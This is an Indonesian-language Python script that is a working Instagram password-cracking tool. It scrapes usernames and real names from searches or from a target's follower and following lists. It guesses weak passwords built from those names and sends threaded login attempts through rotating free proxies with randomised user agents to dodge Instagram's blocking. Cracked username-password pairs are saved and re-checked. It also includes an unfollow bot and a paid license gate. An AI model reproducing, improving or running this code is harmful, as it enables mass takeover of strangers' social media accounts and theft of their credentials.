try:
    import json
    import uuid
    import hmac
    import random
    import hashlib
    import urllib
    import stdiomask
    import urllib.request
    import calendar
except ImportError as e:
    exit(f'\n [\033[1;35m>\033[0m] module {e} belum terinstall')
import requests
import bs4
import json
import os
import sys
import random
import datetime
import time
import re
try:
    import rich
except ImportError:
    os.system('pip install rich')
    time.sleep(1)
    try:
        import rich
    except ImportError:
        exit('Tidak Dapat Menginstall Module rich, Coba Install Manual (pip install rich)')
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from time import sleep
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from bs4 import BeautifulSoup as parser
import time
day = datetime.now().strftime("%d-%b-%Y")
nyMnD = 5
nyMxD = 10
current_GMT = time.gmtime(time.time())
insta_log = 'https://www.instagram.com/accounts/login/?force_classic_login=&'
url = 'https://www.instagram.com'
menudump = []
try:
    os.mkdir('result')
except:
    pass

try:
    prox = requests.get(
        'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.prox.txt', 'w').write(prox)
except Exception as e:
    print('GAGAL')

prox = open('.prox.txt', 'r').read().splitlines()
CY = '\033[96;1m'
H = '\033[1;32m'  # HIJAU
M = '\033[1;31m'  # MERAH
K = '\033[1;33m'  # KUNING
U = '\033[1;35m'  # UNGU
O = '\033[38;2;255;127;0;1m'  # ORANGE
C = '\033[0m'  # CLEAR
B = '\x1b[1;94m'  # BIRU
N = '\x1b[0m'  # WARNA MATI
USN = "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)"
ugen = open('ua.txt', 'r').read().splitlines()
internal, external, success, checkpoint, loop, following, lisensikuni, lisensiku = [
], [], [], [], 0, [], [], ['sukses']
s = requests.Session()
# CLEAR


def clear():
    os.system('clear')

# BANNER


def banner():
    clear()
    wel = '# SELAMAT MENIKMATI TOOLS MR.GHOFUR'
    wel2 = mark(wel, style='purple')
    sol().print(wel2)
    au = 'AUTHOR    : MR.GHOFUR \nADMIN     : MR.EJE\nWHATSAPP  :  +230 5297 0037'
    pengembang1 = (au)
    cetak(nel(pengembang1, title='PENGEMBANG'))


try:
    # python 2
    urllib_quote_plus = urllib.quote
except:
    # python 3
    urllib_quote_plus = urllib.parse.quote_plus


def cekAPI(cookie):
    user = open('.username', 'r').read()
    try:
        c = s.get("https://www.instagram.com/%s/?__a=1" % (user),
                  cookies={'cookie': cookie}, headers={"user-agent": USN})
        i = c.json()["graphql"]["user"]
        nama = i["full_name"]
        followers = i["edge_followed_by"]["count"]
        following = i["edge_follow"]["count"]
        external.append(f'{nama}|{followers}|{following}')
    except (ValueError, KeyError):
        wel = '# Instagram Checkpoint'
        wel2 = mark(wel, style='red')
        sol().print(wel2)
        time.sleep(4)
        os.remove('.kukis.log')
        os.remove('.username')
        exit()

    return external, user


def login_kamu():
    if "sukses" in lisensiku:
        try:
            kuki = open('.kukis.log', 'r').read()
        except FileNotFoundError:
            banner()
            wel = '# Pilih Cara Kamu Login'
            wel2 = mark(wel, style='blue')
            sol().print(wel2)
            io = '[1] Login Menggunakan Cookie\n[2] Login Menggunakan Username & Password'
            oi = nel(io)
            cetak(nel(oi))
            loginpil = input(f"[•] Masukan Pilihan :{C} ")
            if loginpil == '1':
                wel = '# Gunakan username dan cookies instagram untuk login. sebelum login pastikan akun bersifat publik bukan privat'
                wel2 = mark(wel, style='red')
                sol().print(wel2)
                us = input(f'{C}[•] Masukan Username :{C}')
                cok = input(f'{C}[•] Masukan Cookie :{C}')
                kuki = open('.kukis.log', 'w').write(cok)
                user = open('.username', 'w').write(us)
                os.system('python ig1.py')
            elif loginpil == '2':
                login()
        ex, user = cekAPI(kuki)
        cookie = {'cookie': kuki}
        instagram(ex, user, cookie).menu()
    else:
        login()


def login():
    global external
    try:
        wel = '# Gunakan username dan password instagram untuk login. sebelum login pastikan akun bersifat publik bukan privat'
        wel2 = mark(wel, style='red')
        sol().print(wel2)
        us = input(f"{C}[•] Masukan username: {C}")
        pw = stdiomask.getpass(prompt=f'{C}[•] Masukan password: {C}')
    except KeyboardInterrupt:
        wel = '# KeyboardInterrupt terdeteksi... keluar !'
        wel2 = mark(wel, style='red')
        sol().print(wel2)
        exit()
    x = instagramAPI(us, pw).loginAPI()
    if x.get('status') == 'success':
        open('.username', 'a').write(us)
        open('.kukis.log', 'a').write(x.get('cookie'))
        cookie = {'cookie': x.get('cookie')}
        print(f'\n{H}>{C} Login berhasil')
        os.system('python ig.py')
    elif x.get('status') == 'checkpoint':
        wel = '# Login checkpoint'
        wel2 = mark(wel, style='red')
        sol().print(wel2)
        login()
    else:
        wel = '# Username atau password yang anda masukan salah'
        wel2 = mark(wel, style='red')
        sol().print(wel2)
        login()


class instagram:
    def __init__(self, external, username, cookie):
        self.ext = external
        self.username = username
        self.cookie = cookie
        self.s = requests.Session()

    def logo(self):
        for i in external:
            try:
                nama = i.split('|')[0]
                followers = i.split('|')[1]
                following = i.split('|')[2]
            except:
                pass
            banner()
            welcome = f'''[{C}•{C}]Selamat Datang : {nama}
[{C}•{C}]Username       : {self.username}
[{C}•{C}]Followers      : {followers}
[{C}•{C}]Following      : {following}'''
            print(welcome)
            io = '[01] Crack Dari Pencarian\n[02] Crack Dari Pengikut\n[03] Crack dari Mengikuti\n[04] Check Status Crack\n[05] Lihat Hasil Crack\n[R] Laporkan Bug\n[C] Changelog\n[E] Exit'
            oi = nel(io, title='MENU')
            sol().print(oi)

    def BUG(self):
        bug = f'[•] Bantu saya mengembangkan script ini. apapun bugnya tolong laporkan kepada saya, semakin dikit bugnya semakin baik scriptnya.\n[•] Anda bisa melaporkan langsung ke wa admin +230 5297 0037\n[•]  NITCH ADMIN BAIK BANGET'
        bug1 = nel(bug, style='cyan')
        cetak(nel(bug1, title='REPORT BUG'))
        exit()

    def ChangeLog(self):
        io = '[1] Fix bug login instagram\n[2] Ganti tampilan scripts\n[3] Fix bug lisensi invalid'
        oi = nel(io, style='cyan')
        cetak(nel(oi, title='Fitur yang di update'))

        io = '[1] Bot unfollow instagram\n[2] Bot spam komen'
        oi = nel(io, style='cyan')
        cetak(nel(oi, title='Fitur tambahan'))

        io = '[1] Untuk fitur brute force masih dalam perbaikan\n[2] Untuk fitur Bot unfollow masih dalam perbaikan\n[3] Untuk fitur bot komen masih dalam perbaikan'
        oi = nel(io, style='cyan')
        cetak(nel(oi, title='Fix Bug'))
        exit()

    def Exit(self):
        kel = '# Apakah anda yakin ingin keluar ?'
        kel1 = mark(kel, style='red')
        sol().print(kel1)
        x = input(f'\n{C}[•] Jawaban [y/t] : {C}')
        if x in ('y', 'Y'):
            os.remove('.kukis.log')
            os.remove('.username')
            os.system('python ig2.py')
        elif x in ('t', 'T'):
            os.system('python ig2.py')
        else:
            self.Exit()

    def sixAPI(self, six_id):
        url = "https://www.instagram.com/web/search/topsearch/?context=blended&query=" + \
            six_id+"&rank_token=0.3953592318270893&count=1"
        x = requests.get(url)
        x_jason = x.json()
        uid = str(x_jason['users'][0].get("user").get("pk"))
        return uid

    def unfollowAPI(self, user_id, username_id, cookie):
        uuid = generateUUID(True)
        xx = self.s.get("https://www.instagram.com/",
                        headers={"user-agent": uaku}).content
        crf_token = re.findall(
            '{"config":{"csrf_token":"(.*)","viewer"', str(xx))[0]
        s.headers.update({'Connection': 'close',
                          'Accept': '*/*',
                          'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                          'Cookie2': '$Version=1',
                          'Accept-Language': 'en-US',
                          'User-Agent': uaku()})

        data = json.dumps({'_uuid': uuid,
                           '_uid': username_id,
                           'user_id': user_id,
                           '_csrftoken': crf_token})

        self.payload = 'signed_body={}.{}&ig_sig_key_version=4'.format(
            self.generateUUID(False),
            urllib.request.quote(data))
        return s.post('https://i.instagram.com/api/v1/friendships/destroy/%s/' % (user_id), self.payload, cookies=cookie).text

    def searchAPI(self, cookie, nama):
        try:
            x = s.get('https://www.instagram.com/web/search/topsearch/?count=100000&context=blended&query=%s&rank_token=0.21663777590422106&include_reel=true' %
                      (nama), cookies=cookie, headers={"user-agent": USN})
            x_jason = json.loads(x.text)
            for i in x_jason['users']:
                user = i['user']
                username = user['username']
                fullname = user['full_name']
                internal.append(f'{username}|{fullname}')
        except requests.exceptions.ConnectionError:
            exit(f'\n [{M}!{C}] Koneksi internet bermasalah')
        return internal

    def idAPI(self, cookie, id):
        if 'sukses' in lisensiku:
            try:
                m = s.get('https://www.instagram.com/%s/?__a=1' %
                          (id), cookies=cookie, headers={"user-agent": USN})
                m_jason = m.json()["graphql"]["user"]
                idx = m_jason["id"]
            except requests.exceptions.ConnectionError:
                exit(f"\n{M}┣[!] Koneksi internet bermasalah{C}")
            except Exception as e:
                exit(
                    f"\n{M}┣[!] Username yang anda masukan tidak di temukan pastikan target bersifat publik{C}")
            return idx
        else:
            lisensi()

    def infoAPI(self, cookie, api, id):
        if 'sukses' in lisensiku:
            try:
                idtar = f'# [•] TUNGGU SEDANG MENGUMPULKAN ID [•]'
                idtar1 = mark(idtar, style='yellow')
                sol().print(idtar1)
                x = s.get(api % (id), cookies=cookie,
                          headers={"user-agent": USN})
                x_jason = json.loads(x.text)
                for i in x_jason['users']:
                    username = i["username"]
                    nama = i["full_name"]
                    internal.append(f'{username}|{nama}')
                    following.append(username)
                if 'pengikut' in menudump:
                    maxid = x_jason['next_max_id']
                    for z in range(9999):
                        x = s.get('https://i.instagram.com/api/v1/friendships/'+id +
                                  '/followers/?count=100&max_id='+maxid, cookies=cookie, headers={"user-agent": USN})
                        x_jason = json.loads(x.text)
                        try:
                            for i in x_jason['users']:
                                username = i["username"]
                                nama = i["full_name"]
                                internal.append(f'{username}|{nama}')
                                following.append(username)
                            try:
                                maxid = x_jason['next_max_id']
                            except:
                                break
                        except:
                            if 'challenge' in x.text:
                                break
                            else:
                                continue
                else:
                    pass
            except requests.exceptions.ConnectionError:
                exit(f'\n{M}[!] Koneksi internet bermasalah{C}')
            except Exception as e:
                print(f'\n{M}[!] Username tidak di temukan{C}')
            return internal
        else:
            lisensi()

    def passwordAPI(self, xnx):
        idtar = f'# [•] TOTAL ID  : {len(internal)} [•]'
        idtar1 = mark(idtar, style='green')
        sol().print(idtar1)
        komb = '[1] FirstName123 Firstname1234\n[2] FirtsName123 Firstname1234 Firstname12345 FullName\n[3] FirstName+123,FullName,Full Name'
        komb1 = nel(komb, title='PILIHAN PASSWORD')
        sol().print(komb1)
        c = input(f'{C}[•] Masukan Pilihan :{C} ')
        if c == '1':
            self.generateAPI(xnx, c)
        elif c == '2':
            self.generateAPI(xnx, c)
        elif c == '3':
            self.generateAPI(xnx, c)
        else:
            self.passwordAPI(xnx)

    def generateAPI(self, user, o):
        io = f'[•] Hasil OK disimpan ke: result/{day}.txt\n[•] Hasil CP disimpan ke: result/{day}.txt'
        oi = nel(io, title='PROSES CRACK')
        sol().print(oi)
        ipku = '# [•] Jika alamat IP terkena spam hidupkan mode pesawat selama 10 detik'
        ipku1 = mark(ipku, style='red')
        sol().print(ipku1)
        with ThreadPoolExecutor(max_workers=15) as shinkai:
            for i in user:
                try:
                    username = i.split("|")[0]
                    password = i.split("|")[1].lower()
                    for w in password.split(" "):
                        if len(w) < 3:
                            continue
                        else:
                            w = w.lower()
                            if o == "1":
                                if len(w) == 3 or len(w) == 4 or len(w) == 5:
                                    sandi = [w+'123', w+'1234']
                                else:
                                    sandi = [w]
                            elif o == "2":
                                if len(w) == 3 or len(w) == 4 or len(w) == 5:
                                    sandi = [w+'123', w, w+'1234', w+'12345', w+'321',
                                             password.lower(), 'sayang', 'anjing', 'bangsat']
                                else:
                                    sandi = [w+'123', w, w+'1234', w+'12345']
                            elif o == "3":
                                if len(w) == 3 or len(w) == 4 or len(w) == 5:
                                    sandi = [w+'123', w, password.lower()]
                                else:
                                    sandi = [w+'123', w, password.lower()]
                            shinkai.submit(self.crackAPI, username, sandi)
                except:
                    pass
        print('\n')
        oi = '# CRACK SELESAI'
        io = mark(oi, style='yellow')
        sol().print(io)
        exit()

    def APIinfo(self, user):
        try:
            x = s.get("https://www.instagram.com/%s/?__a=1" %
                      (user), headers={"user-agent": USN})
            x_jason = x.json()["graphql"]["user"]
            nama = x_jason["full_name"]
            pengikut = x_jason["edge_followed_by"]["count"]
            mengikut = x_jason["edge_follow"]["count"]
            postingan = x_jason["edge_owner_to_timeline_media"]["count"]
        except:
            pass

        return nama, pengikut, mengikut, postingan

    def crackAPI(self, user, pas):
        global loop, success, checkpoint
        sys.stdout.write(
            f"\r{CY}┣[🐊] [{K}{loop}/{len(internal)}{C}] {H}[ OK : {len(success)}]{C}  {K}[ CP : {len(checkpoint)}]{C} "), sys.stdout.flush()
        try:
            for pw in pas:
                ts = calendar.timegm(current_GMT)
                nip = random.choice(prox)
                proxs = {'http': 'socks4://'+nip}
                aa = 'Mozilla/5.0 (Linux; Android '
                b = random.choice(
                    ['4', '5', '6', '7', '8', '9', '10', '11', '12'])
                c = 'SAMSUNG GT-'
                d = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K',
                                  'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
                e = random.randrange(1, 999)
                f = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K',
                                  'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
                g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
                h = random.randrange(73, 100)
                i = '0'
                j = random.randrange(4200, 4900)
                k = random.randrange(40, 150)
                l = 'Mobile Safari/537.36'
                uaku = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
                token = s.get(
                    'https://www.instagram.com/accounts/login/?next=/accounts/logout/')
                headers = {
                    'Host': 'www.instagram.com',
                    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
                    'x-ig-app-id': '1217981644879628',
                    'x-ig-www-claim': 'hmac.AR3rTw8coDXFSFwg2boEF949TcIRPhYyxFH8uftpHvSjbL76',
                    'sec-ch-ua-mobile': '?1',
                    'x-instagram-ajax': '78f5fe0e689b',
                    'content-type': 'application/x-www-form-urlencoded',
                    'accept': '*/*',
                    'x-requested-with': 'XMLHttpRequest',
                    'x-asbd-id': '198387',
                    'user-agent': uaku,
                    'sec-ch-ua-platform': '"Android"',
                    'x-csrftoken': token.cookies['csrftoken'],
                    'origin': 'https://www.instagram.com',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-dest': 'empty',
                    'referer': 'https://www.instagram.com/accounts/login/?next=/accounts/logout/',
                    'accept-encoding': 'gzip, deflate, br',
                    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
                }
#					"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999),pw),

                param = {
                    "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{pw}",
                    "username": user,
                    "optIntoOneTap": 'false',
                    "queryParams": "{}",
                    "stopDeletionNonce": "",
                    "trustedDeviceRecords": "{}"}
                x = s.post("https://www.instagram.com/accounts/login/ajax/",
                           headers=headers, data=param, proxies=proxs)
                x_jason = json.loads(x.text)
                if "userId" in str(x_jason):
                    nama, pengikut, mengikut, postingan = self.APIinfo(user)
                    io = f'Nama     : {nama}\nUsername : {user}\nPassword : {pw}\nPengikut : {pengikut}\nMengikuti: {mengikut}\nPostingan: {postingan}'
                    oi = nel(io, style='')
                    print('\n')
                    cetak(nel(oi, title='LIVE'))
                    open(
                        f"result/success-{day}.txt", "a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
                    success.append(user)
                    break

                elif 'checkpoint_url' in str(x_jason):
                    nama, pengikut, mengikut, postingan = self.APIinfo(user)
                    io = f'Nama     : {nama}\nUsername : {user}\nPassword : {pw}\nPengikut : {pengikut}\nMengikuti: {mengikut}\nPostingan: {postingan}'
                    print('\n')
                    oi = nel(io, style='yellow')
                    cetak(nel(oi, title='CHECKPOINT'))
                    open(
                        f"result/checkpoint-{day}.txt", "a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
                    checkpoint.append(user)
                    break

                elif 'Please wait a few minutes' in str(x.text):
                    sys.stdout.write(
                        f"\r┣[{U}!{C}] {U}IP KENA SPAM TUNGGU BEBERAPA MENIT{C}")
                    sys.stdout.flush()
                    sleep(0)
#					self.crackAPI(user,pas)
                elif 'ip_block' in str(x.text):
                    sys.stdout.write(
                        f"\r┣[{U}!{C}] {U}IP DI BLOKIR ON OFF MODE PESAWAT{C}")
                    sys.stdout.flush()
                    sleep(0)
                    self.crackAPI(user, pas)
                elif 'spam' in str(x.text):
                    sys.stdout.write(
                        f"\r┣[{U}!{C}] {U}TERDETEKSI SPAM ON OFF MODE PESAWAT{C}")
                    sys.stdout.flush()
                    sleep(0)
#					self.crackAPI(user,pas)

                else:
                    continue

            loop += 1
        except:
            self.crackAPI(user, pas)

    def checkAPI(self, user, pw):
        try:
            aa = 'Mozilla/5.0 (Linux; Android '
            b = random.choice(['4', '5', '6', '7', '8', '9', '10', '11', '12'])
            c = 'SAMSUNG GT-'
            d = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K',
                              'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
            e = random.randrange(1, 999)
            f = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K',
                              'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
            g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
            h = random.randrange(73, 100)
            i = '0'
            j = random.randrange(4200, 4900)
            k = random.randrange(40, 150)
            l = 'Mobile Safari/537.36'
            uaku = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
            token = s.get("https://www.instagram.com/",
                          headers={"user-agent": uaku}).content
            crf_token = re.findall(r"\"csrf_token\"\:\"(.*?)\"", str(token))[0]
            s.headers.update({
                'authority': 'www.instagram.com',
                'x-ig-www-claim': 'hmac.AR08hbh0m_VdJjwWvyLFMaNo77YXgvW_0JtSSKgaLgDdUu9h',
                'x-instagram-ajax': '82a581bb9399',
                'content-type': 'application/x-www-form-urlencoded',
                'accept': '*/*',
                'user-agent': uaku,
                'x-requested-with': 'XMLHttpRequest',
                'x-csrftoken': crf_token,
                'x-ig-app-id': '936619743392459',
                'origin': 'https://www.instagram.com',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://www.instagram.com/',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'
            })

            param = {
                "username": user,
                "enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999), pw),
                "optIntoOneTap": False,
                "queryParams": {},
                "stopDeletionNonce": "",
                "trustedDeviceRecords": {}
            }
            x = s.post(
                "https://www.instagram.com/accounts/login/ajax/", data=param)
            sleep(1)
            x_jason = json.loads(x.text)
            if "userId" in x.text:
                nama, pengikut, mengikut, postingan = self.APIinfo(user)
                io = f'Nama     : {nama}\nUsername : {user}\nPassword : {pw}\nPengikut : {pengikut}\nMengikuti: {mengikut}\nPostingan: {postingan}'
                oi = nel(io, style='')
                print('\n')
                cetak(nel(oi, title='LIVE'))

            elif 'checkpoint_url' in x.text:
                nama, pengikut, mengikut, postingan = self.APIinfo(user)
                io = f'Nama     : {nama}\nUsername : {user}\nPassword : {pw}\nPengikut : {pengikut}\nMengikuti: {mengikut}\nPostingan: {postingan}'
                oi = nel(io, style='yellow')
                print('\n')
                cetak(nel(oi, title='CHECKPOINT'))

            elif 'Please wait a few minutes' in str(x.text):
                sys.stdout.write(
                    f"\r {U}!{C}] {U}Please wait a few minutes second{C}")
                sys.stdout.flush()
                sleep(10)
                self.checkAPI(user, pw)
        except:
            self.checkAPI(user, pw)

    def menu(self):
        self.logo()
        c = input(f' {C}[PILIH]{C} :  ')
        if c == '':
            self.menu()
        elif c in ('1', '01'):
            mas = '# Masukan jumlah target'
            mas1 = mark(mas, style='blue')
            sol().print(mas1)
            m = int(input(f'\n{C}[•] Jumlah : {C}'))
            print('')
            mas = '# Masukan nama random untuk di searching'
            mas1 = mark(mas, style='blue')
            sol().print(mas1)
            for i in range(m):
                i+1
                nama = input(
                    f'{C}[•] Masukan nama {H}({C}{len(internal)}{C}):{N} ')
                name = self.searchAPI(self.cookie, nama)
            self.passwordAPI(name)

        elif c in ('2', '02'):
            menudump.append('pengikut')
            mas = '# Target harus bersifat publik jangan privat'
            mas1 = mark(mas, style='red')
            sol().print(mas1)
            m = input(f'{C}[•] Username target : {C}')

            id = self.idAPI(self.cookie, m)
            info = self.infoAPI(
                self.cookie, 'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100', id)
            self.passwordAPI(info)

        elif c in ('3', '03'):
            mas = '# Target harus bersifat publik jangan privat'
            mas1 = mark(mas, style='red')
            sol().print(mas1)
            m = input(f'{CY}[•] Username target : {C}')

            id = self.idAPI(self.cookie, m)
            info = self.infoAPI(
                self.cookie, 'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000', id)
            self.passwordAPI(info)

        elif c in ('4', '04'):
            print('')
            for i in os.listdir('result'):
                print(f' {U}[{U}+{C}] {i}')
            c = input(f'\n {N}{C}[•] Masukan nama file :  {C}')
            g = open("result/%s" % (c)).read().splitlines()
            print(f'\n{C}[+] Total Result {H}{len(g)}{C}')
            print(
                f'\n{C}[!] Proses mengecek status akun. silahkan tunggu sebentar{C}\n')
            for s in g:
                usr = s.split("|")[0]
                pwd = s.split("|")[1]
                self.checkAPI(usr, pwd)
            exit(f'\n\n{K}[#] proses check selesai...{C}')

        elif c in ('5', '05'):
            print('')
            for i in os.listdir('result'):
                print(f' [{U}>{C}] {i}')
            c = input(f'\n {U}[•] Masukan nama file: {C}')
            g = open("result/%s" % (c)).read().splitlines()
            xx = c.split("-")
            xc = xx[0]
            print(f'\n{K}┣[>] Total result yang di temukan [{H}{len(g)}{C}]')
            for s in g:
                usr = s.split("|")[0]
                pwd = s.split("|")[1]
                fol = s.split("|")[2]
                ful = s.split("|")[3]
                if xc == "checkpoint":
                    print(f"""
 [{M}+{C}] {M}CHECKPOINT LOGIN{C}:
  {M}|{C}
  {M}├╴>{C} Username: {O}{usr}{C}
  {M}├╴>{C} Password: {O}{pwd}{C}
  {M}├╴>{C} Followers: {O}{fol}{C}
  {M}├╴>{C} Following: {O}{ful}{C}
					""")
                    sleep(0.05)
                else:
                    print(f"""
  {H}[>]{C}{H} STATUS :  LIVE {C}
  {H}[>]{C}{H} Username : {H}{usr}{C}
  {H}[>]{C}{H} Password : {H}{pwd}{C}
  {H}[>]{C}{H} Pengikut : {H}{fol}{C}
  {H}[>]{C}{H} Mengikuti : {H}{ful}{C}
					""")
                    sleep(0.05)
        elif c in ('6', '06'):
            global following
            six = 0
            print(f'\n [{U}!{C}] Bot Unfollow-All Dijalankan\n')
            x = open('.kukis.log', 'r').read()
            x_id = re.findall('sessionid=(\d+)', x)[0]
            back = self.infoAPI(
                self.cookie, 'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000', x_id)
            for i in following:
                six += 1
                sleep(float(random.uniform(nyMnD*10, nyMxD*10) / 10))
                six_id = self.sixAPI(i)
                print(f' {str(six)}{U}}}{C} {i} {H}Unfollow-Berhasil{C}')
                self.unfollowAPI(six_id, '5452333948', self.cookie)
                # print(w)
            input(f'\n\n [{U}#{C}] Unfollow-all selesai...')
            self.menu()

        elif c in ('r', 'R'):
            self.BUG()
        elif c in ('c', 'C'):
            self.ChangeLog()
        elif c in ('e', 'E'):
            self.Exit()

        else:
            self.menu()


def tlisensi():
    banner()
    wel = '# LICENSE IS NOT APPLICABLE OR WRONG'
    wel2 = mark(wel, style='red')
    sol().print(wel2)
    time.sleep(2)
    lisen = input('[•] Enter License : ')
    open('.lisen.txt', 'w').write(lisen)
    lisensi()


def lisensi():
    try:
        cek = open('.lisen.txt').read()
        lisensikuni.append(cek)
    except:
        tlisensi()
    ses = requests.Session()
    res = ses.get(
        'https://app.cryptolens.io/api/key/Activate?token=WyIxODM1ODY5NSIsImIwVVQyVmZGSUVlYlk4NUIxazIrV0hLclAyMG16UDVRaDI3K0NMejciXQ==&ProductId=15062&Key='+lisensikuni[0]).json()
    status = res['licenseKey']['key']
    if status == cek:
        banner()
        wel = '# LICENSE APPLICABLE '
        wel2 = mark(wel, style='cyan')
        sol().print(wel2)
        time.sleep(2)
        lisensiku.append("sukses")
        login_kamu()
    else:
        tlisensi()


if __name__ == '__main__':
    try:
        login_kamu()
    except requests.exceptions.ConnectionError:
        exit(f'\n [{M}!{C}] Koneksi internet bermasalah')
